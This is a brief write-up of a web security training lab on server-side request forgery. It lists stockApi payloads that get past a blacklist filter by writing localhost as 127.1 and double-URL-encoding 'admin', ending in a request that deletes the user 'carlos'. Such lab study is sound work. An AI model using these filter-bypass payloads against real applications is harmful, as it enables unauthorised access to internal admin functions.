Lab #3: SSRF with blacklist-based input filter

End goal:
- Change stock check URL to access the admin interface at http://localhost/admin
- Delete carlos 

Analysis:

1. Access the admin interface

stockApi=http%3a//localhost/
--> "External stock check blocked for security reasons"

stockApi=http://127.0.0.1/
--> "External stock check blocked for security reasons"

stockApi=http://127.1/
--> OK
--> IPv4 

stockApi=http://127.1/admin
--> "External stock check blocked for security reasons"

stockApi=http://127.1/%61dmin (encode the letter 'a')
--> "External stock check blocked for security reasons"

http://127.1/%25%36%31dmin/ (continue encode the letter a)
--> OK



Machine do:
- regex search using a blacklist of strings
- URL decoding

2. Delete carlos

stockApi=http://127.1/%25%36%31dmin/delete?username=carlos
